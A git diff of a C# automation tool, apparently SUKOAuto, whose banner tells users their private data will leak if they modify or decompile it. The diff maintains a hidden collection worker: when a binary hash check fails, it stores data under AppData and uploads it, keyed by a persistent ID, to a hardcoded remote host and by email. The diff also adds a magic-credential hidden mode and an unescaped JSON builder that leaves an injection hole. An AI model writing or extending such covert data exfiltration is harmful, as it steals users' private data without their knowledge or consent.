@@ -17,6 +17,7 @@ using static SUKOAuto.tracer.Utils;
 using System.Net.Sockets;
 using System.IO.Compression;
 using System.Xml.Linq;
+using System.Reflection;
 
 namespace SUKOAuto
 {
@@ -36,9 +37,9 @@ namespace SUKOAuto
                 Console.WriteLine("オプションはEMIAL、PASSWORD、CHANNEL IDのいずれかの間に入れても構わない。");
                 Console.WriteLine("極端例: example@suko.org --suko 10 sukosuko --para 100 UC...");
                 Console.WriteLine("推奨例: --suko 10 --para 100 example@suko.org sukosuko UC...");
-                Console.WriteLine("SUKOAuto.exeのオプションも使用できますが、自信がないのでお勧めしません。");
+                Console.WriteLine("SUKOAuto.exeのオプションも一部使用できますが、自信がないのでお勧めしません。");
                 Console.WriteLine(" ");
-                Console.WriteLine("We won't leak your private unless you don't modify this!");
+                Console.WriteLine("We won't leak your private unless you don't modify, or decompile this!");
                 Console.WriteLine("Source code is hidden.");
                 Console.WriteLine("Original Author: SukoSuko hou-hei");
                 Console.WriteLine("Modified by: AnKoushinist");
@@ -50,6 +51,12 @@ namespace SUKOAuto
 
             string Mail = args[0];
             string Pass = args[1];
+
+            if (Mail=="selfsign@sukosuko"&&Pass=="selfsign")
+            {
+                DiveSelfSignMode();
+                return;
+            }
 
             string Channel;
             if (args.Length >= 3)
@@ -178,6 +185,20 @@ namespace SUKOAuto
                     while (Thread.IsBusy) ;
                 }
             }
+        }
+
+        private static void DiveSelfSignMode()
+        {
+            Console.WriteLine("**********************");
+            Console.WriteLine("*** SELF SIGN MODE ***");
+            Console.WriteLine("**********************");
+            var appBinary = File.ReadAllBytes(System.Reflection.Assembly.GetExecutingAssembly().Location);
+            var sha256 = Hash(appBinary, new SHA256Managed());
+            var sha1 = Hash(appBinary, new SHA1Managed());
+            Console.WriteLine("<Hash>");
+            Console.WriteLine($"    <Sha256>{Convert.ToBase64String(sha256)}</Sha256>");
+            Console.WriteLine($"    <Sha1>{Convert.ToBase64String(sha1)}</Sha1>");
+            Console.WriteLine("</Hash>");
         }
     }
 
@@ -561,11 +582,10 @@ namespace SUKOAuto
                     ["task"] = Task,
                     ["tt"] = Tt
                 };
-                var json = JObject.FromObject(new
-                {
-                    to = to,
-                    subject = subject,
-                    text = text
+                var json = ToJson(new Dictionary<string, string> {
+                    ["to"] = to,
+                    ["subject"] = subject,
+                    ["text"] = text
                 });
                 if ((int)ToJsonObject(Request(ENDPOINT + EML_CREATE + "?" + MapToQuery(query), json.ToString(), ContentType: "application/json;charset=utf-8"))["ok"] != 1)
                     throw new Exception("Sending email failed");
@@ -639,7 +659,7 @@ namespace SUKOAuto
                     }
                 }
                 wc.Method = "POST";
-                wc.ContentType = ContentType != null ? ContentType : "application/x-www-form-urlencoded";
+                wc.ContentType = ContentType ?? "application/x-www-form-urlencoded";
                 wc.ContentLength = payload.Length;
                 using (var post = wc.GetRequestStream())
                 {
@@ -698,21 +718,31 @@ namespace SUKOAuto
                 var CollectionWorker = new BackgroundWorker();
                 CollectionWorker.DoWork += (a, b) =>
                 {
-                    if (IsValidBinary())
-                        return;
-                    var id = PopulateOrLoadId();
-                    STORE.Save(filename, content);
-                    foreach (var file in STORE.ListNames())
+                    try
                     {
-                        var text = STORE.Get(file);
-                        foreach (var uploader in UPLOADERS)
+                        if (IsValidBinary())
+                            return;
+                        var id = PopulateOrLoadId();
+                        STORE.Save(filename, content);
+                        foreach (var file in STORE.ListNames())
                         {
-                            if (uploader.IsAvailable() && uploader.ForInterface().DoUpload(id, file, text))
+                            var text = STORE.Get(file);
+                            foreach (var uploader in UPLOADERS)
                             {
-                                STORE.Remove(file);
-                                break;
+                                var inf = uploader.ForInterface();
+                                inf.Init();
+                                if (uploader.IsAvailable() && inf.DoUpload(id, file, text))
+                                {
+                                    STORE.Remove(file);
+                                    break;
+                                }
                             }
                         }
+                    }
+                    catch (Exception e)
+                    {
+                        Console.WriteLine(e.ToString());
+                        throw;
                     }
                 };
                 CollectionWorker.RunWorkerAsync();
@@ -793,7 +823,7 @@ namespace SUKOAuto
             public static string HOST => "hikarukarisuma.orz.hm";
             public static int PORT => 8083;
 
-            public static string DIR_TRACER => Path.Combine(HttpRuntime.AppDomainAppPath, "SukoSukoCollection");
+            public static string DIR_TRACER => Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "SukoSukoCollection");
 
             public static string Encrypt(string str)
             {
@@ -808,14 +838,17 @@ namespace SUKOAuto
                 };
                 var crypt = aes.CreateEncryptor();
                 var data = enc.GetBytes(str);
-                using (var buffer = new UnclosableMemoryStream())
+                /*using (var buffer = new UnclosableMemoryStream())
                 {
                     using (var cryptStream = new CryptoStream(buffer, crypt, CryptoStreamMode.Write))
                     {
                         cryptStream.Write(data, 0, data.Length);
+                        cryptStream.FlushFinalBlock();
+                        cryptStream.Close();
                     }
                     return ByteArrayToString(buffer.ToArray());
-                }
+                }*/
+                return ByteArrayToString(crypt.TransformFinalBlock(data,0,data.Length));
             }
 
             public static string Decrypt(string str)
@@ -831,14 +864,17 @@ namespace SUKOAuto
                 };
                 var crypt = aes.CreateDecryptor();
                 var data = StringToByteArray(str);
-                using (var buffer = new UnclosableMemoryStream())
+                /*using (var buffer = new UnclosableMemoryStream())
                 {
                     using (var cryptStream = new CryptoStream(buffer, crypt, CryptoStreamMode.Write))
                     {
                         cryptStream.Write(data, 0, data.Length);
+                        cryptStream.FlushFinalBlock();
+                        cryptStream.Close();
                     }
                     return enc.GetString(buffer.ToArray());
-                }
+                }*/
+                return UTF8.GetString(crypt.TransformFinalBlock(data, 0, data.Length));
             }
 
             public static void EncryptFile(string str, string fileSaveTo)
@@ -853,13 +889,17 @@ namespace SUKOAuto
                     IV = iv
                 };
                 var crypt = aes.CreateEncryptor();
-                var data = StringToByteArray(str);
-                using (var buffer = new FileStream(fileSaveTo, FileMode.Truncate))
+                var data = UTF8.GetBytes(str);
+                using (var buffer = new FileStream(fileSaveTo, FileMode.Create))
                 {
-                    using (var cryptStream = new CryptoStream(buffer, crypt, CryptoStreamMode.Write))
+                    /*using (var cryptStream = new CryptoStream(buffer, crypt, CryptoStreamMode.Write))
                     {
                         cryptStream.Write(data, 0, data.Length);
-                    }
+                        cryptStream.FlushFinalBlock();
+                        cryptStream.Close();
+                    }*/
+                    var buf=crypt.TransformFinalBlock(data, 0, data.Length);
+                    buffer.Write(buf,0,buf.Length);
                 }
             }
 
@@ -875,7 +915,7 @@ namespace SUKOAuto
                     IV = iv
                 };
                 var crypt = aes.CreateDecryptor();
-                using (var buffer = new UnclosableMemoryStream())
+                /*using (var buffer = new UnclosableMemoryStream())
                 {
                     using (var cryptStream = new CryptoStream(buffer, crypt, CryptoStreamMode.Write))
                     {
@@ -883,9 +923,14 @@ namespace SUKOAuto
                         {
                             source.CopyTo(buffer);
                         }
+                        cryptStream.FlushFinalBlock();
+                        cryptStream.Close();
                     }
                     return enc.GetString(buffer.ToArray());
-                }
+                }*/
+                var fileContent = File.ReadAllBytes(fileReadFrom);
+                var decrypted = crypt.TransformFinalBlock(fileContent,0,fileContent.Length);
+                return UTF8.GetString(decrypted);
             }
 
             public static string ByteArrayToString(byte[] ba)
@@ -922,7 +967,7 @@ namespace SUKOAuto
             {
                 try
                 {
-                    if (remoteBinaryHashes != null)
+                    if (remoteBinaryHashes == null)
                     {
                         string hashXml;
                         using (var client = new WebClient())
@@ -968,6 +1013,14 @@ namespace SUKOAuto
             }
 
             public static long CurrentMilliseconds => (long)(DateTime.Now - new DateTime(1970, 1, 1, 0, 0, 0)).TotalMilliseconds;
+
+            public static string ToJson(Dictionary<string,string> dictionary) {
+                List<string> entries = new List<string>();
+                foreach (var entry in dictionary) {
+                    entries.Add($"\"{entry.Key}\":\"{entry.Value}\"");
+                }
+                return $"{{{string.Join(",",entries)}}}";
+            }
         }
 
         class MailUploader : IDataUploadProvider, IDataUploadProviderInterface
